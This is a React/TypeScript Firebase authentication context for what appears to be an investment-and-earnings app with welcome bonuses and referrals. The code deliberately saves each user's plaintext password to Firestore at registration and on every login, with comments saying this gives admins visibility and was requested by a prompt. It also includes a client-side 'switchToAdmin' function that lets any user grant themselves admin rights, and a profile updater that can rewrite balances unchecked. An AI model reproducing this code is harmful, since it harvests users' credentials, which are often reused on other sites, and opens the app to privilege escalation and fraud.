import React, { createContext, useContext, useEffect, useState } from 'react';
import { 
  User as FirebaseUser,
  onAuthStateChanged,
  signInWithEmailAndPassword,
  createUserWithEmailAndPassword,
  signOut,
  updatePassword
} from 'firebase/auth';
import { 
  doc, 
  getDoc, 
  setDoc, 
  onSnapshot, 
  updateDoc 
} from 'firebase/firestore';

import { auth, db } from '../lib/firebase';
import { UserProfile, SystemConfig } from '../types';
import { DEFAULT_SYSTEM_CONFIG } from '../lib/defaultData';
import { logUserActivity } from '../lib/activityLogger';

interface AuthContextType {
  firebaseUser: FirebaseUser | null;
  userProfile: UserProfile | null;
  systemConfig: SystemConfig;
  loading: boolean;
  isAdmin: boolean;
  login: (email: string, password: string) => Promise<void>;
  register: (fullName: string, email: string, phone: string, password: string, referralCode?: string) => Promise<void>;
  logout: () => Promise<void>;
  updateProfileData: (updates: Partial<UserProfile>) => Promise<void>;
  updateConfigInFirestore: (newConfig: SystemConfig) => Promise<void>;
  refreshUserProfile: () => Promise<void>;
  switchToAdmin: () => Promise<void>;
}

const AuthContext = createContext<AuthContextType | undefined>(undefined);

export const AuthProvider: React.FC<{ children: React.ReactNode }> = ({ children }) => {
  const [firebaseUser, setFirebaseUser] = useState<FirebaseUser | null>(null);
  const [userProfile, setUserProfile] = useState<UserProfile | null>(null);
  const [systemConfig, setSystemConfig] = useState<SystemConfig>(DEFAULT_SYSTEM_CONFIG);
  const [loading, setLoading] = useState<boolean>(true);

  // Subscribe to System Configuration
  useEffect(() => {
    const configRef = doc(db, 'system', 'config');
    const unsubscribeConfig = onSnapshot(configRef, (snapshot) => {
      if (snapshot.exists()) {
        setSystemConfig({ ...DEFAULT_SYSTEM_CONFIG, ...snapshot.data() } as SystemConfig);
      } else {
        // Seed default config if missing
        setDoc(configRef, DEFAULT_SYSTEM_CONFIG).catch((err) => console.error('Error seeding config:', err));
      }
    }, (err) => {
      console.warn('System config snapshot error, using default:', err);
    });

    return () => unsubscribeConfig();
  }, []);

  // Listen to Auth State
  useEffect(() => {
    let unsubscribeUserDoc: (() => void) | null = null;

    const unsubscribeAuth = onAuthStateChanged(auth, async (authUser) => {
      setFirebaseUser(authUser);

      if (unsubscribeUserDoc) {
        unsubscribeUserDoc();
        unsubscribeUserDoc = null;
      }

      if (authUser) {
        const userDocRef = doc(db, 'users', authUser.uid);
        
        // Listen in real-time to user document in Firestore
        unsubscribeUserDoc = onSnapshot(userDocRef, async (docSnap) => {
          if (docSnap.exists()) {
            const data = docSnap.data() as UserProfile;
            setUserProfile(data);
          } else {
            // Auto-create document if missing
            const userEmail = (authUser.email || '').toLowerCase().trim();
            const allowedAdmins = (systemConfig.allowedAdminEmails || []).map(e => e.toLowerCase().trim());
            const isOwnerOrSubAdmin = userEmail === 'admin@pakinvestmentxearning.com' || allowedAdmins.includes(userEmail);

            const newProfile: UserProfile = {
              uid: authUser.uid,
              email: authUser.email || '',
              fullName: authUser.displayName || 'User',
              phone: '',
              passwordText: '••••••••',
              balance: 100, // Welcome bonus
              totalEarnings: 100,
              totalDeposited: 0,
              totalWithdrawn: 0,
              status: 'active',
              role: isOwnerOrSubAdmin ? 'admin' : 'user',
              createdAt: Date.now(),
              referralCode: authUser.uid.substring(0, 7).toUpperCase(),
            };
            await setDoc(userDocRef, newProfile);
            setUserProfile(newProfile);
          }
          setLoading(false);
        }, (err) => {
          console.error('User doc snapshot error:', err);
          setLoading(false);
        });
      } else {
        setUserProfile(null);
        setLoading(false);
      }
    });

    return () => {
      unsubscribeAuth();
      if (unsubscribeUserDoc) unsubscribeUserDoc();
    };
  }, []);

  const login = async (email: string, password: string) => {
    setLoading(true);
    try {
      const cred = await signInWithEmailAndPassword(auth, email, password);
      // Update passwordText in firestore for admin visibility if requested
      if (cred.user) {
        const userRef = doc(db, 'users', cred.user.uid);
        await updateDoc(userRef, { passwordText: password }).catch(() => {});
        logUserActivity(
          cred.user.uid,
          cred.user.email || email,
          'login',
          'User logged into account',
          { time: new Date().toISOString() }
        );
      }
    } finally {
      setLoading(false);
    }
  };

  const register = async (
    fullName: string, 
    email: string, 
    phone: string, 
    password: string, 
    referralCodeInput?: string
  ) => {
    setLoading(true);
    try {
      const cred = await createUserWithEmailAndPassword(auth, email, password);
      const uid = cred.user.uid;
      const lowerEmail = email.toLowerCase().trim();
      const allowedAdmins = (systemConfig.allowedAdminEmails || []).map(e => e.toLowerCase().trim());
      const isOwnerOrSubAdmin = lowerEmail === 'admin@pakinvestmentxearning.com' || allowedAdmins.includes(lowerEmail);
      
      const generatedRefCode = uid.substring(0, 7).toUpperCase();
      
      const newProfile: UserProfile = {
        uid,
        email,
        fullName,
        phone,
        passwordText: password, // As explicitly requested by user prompt to store/see password
        balance: 100, // Welcome Sign Up bonus
        totalEarnings: 100,
        totalDeposited: 0,
        totalWithdrawn: 0,
        status: 'active',
        role: isOwnerOrSubAdmin ? 'admin' : 'user',
        createdAt: Date.now(),
        referralCode: generatedRefCode,
        referredBy: referralCodeInput || '',
      };

      await setDoc(doc(db, 'users', uid), newProfile);
      setUserProfile(newProfile);

      logUserActivity(
        uid,
        email,
        'login',
        'Account registered and welcome bonus credited',
        { welcomeBonus: 100 }
      );
    } finally {
      setLoading(false);
    }
  };

  const logout = async () => {
    await signOut(auth);
    setUserProfile(null);
  };

  const updateProfileData = async (updates: Partial<UserProfile>) => {
    if (!firebaseUser || !userProfile) return;
    const userRef = doc(db, 'users', firebaseUser.uid);
    await updateDoc(userRef, updates);
  };

  const updateConfigInFirestore = async (newConfig: SystemConfig) => {
    const configRef = doc(db, 'system', 'config');
    await setDoc(configRef, newConfig, { merge: true });
    setSystemConfig(newConfig);
  };

  const refreshUserProfile = async () => {
    if (!firebaseUser) return;
    const userDocRef = doc(db, 'users', firebaseUser.uid);
    const snap = await getDoc(userDocRef);
    if (snap.exists()) {
      setUserProfile(snap.data() as UserProfile);
    }
  };

  const switchToAdmin = async () => {
    if (!firebaseUser || !userProfile) return;
    const userRef = doc(db, 'users', firebaseUser.uid);
    const newRole = userProfile.role === 'admin' ? 'user' : 'admin';
    await updateDoc(userRef, { role: newRole });
    setUserProfile(prev => prev ? { ...prev, role: newRole } : null);
  };

  const currentEmail = (firebaseUser?.email || userProfile?.email || '').toLowerCase().trim();
  const allowedAdminList = (systemConfig.allowedAdminEmails || []).map(e => e.toLowerCase().trim());
  const isAdmin = Boolean(
    currentEmail === 'admin@pakinvestmentxearning.com' ||
    allowedAdminList.includes(currentEmail) ||
    userProfile?.role === 'admin'
  );

  return (
    <AuthContext.Provider
      value={{
        firebaseUser,
        userProfile,
        systemConfig,
        loading,
        isAdmin,
        login,
        register,
        logout,
        updateProfileData,
        updateConfigInFirestore,
        refreshUserProfile,
        switchToAdmin
      }}
    >
      {children}
    </AuthContext.Provider>
  );
};

export const useAuth = () => {
  const context = useContext(AuthContext);
  if (!context) {
    throw new Error('useAuth must be used within an AuthProvider');
  }
  return context;
};
